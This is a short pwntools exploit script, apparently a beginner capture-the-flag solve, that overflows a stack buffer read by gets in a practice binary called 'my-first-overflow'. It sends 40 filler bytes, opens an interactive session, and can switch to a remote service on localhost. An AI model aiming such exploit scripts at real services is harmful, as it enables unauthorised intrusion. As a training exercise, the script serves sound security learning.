#!/usr/bin/env python3
from pwn import *

exe = ELF("./my-first-overflow")

HOST, PORT = "localhost", 1337

context.binary = exe

def main():
    global io

    io = conn()

    # Stack buffer overflow on gets
    payload = b"A" * 40
    io.sendline(payload)

    io.interactive()

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
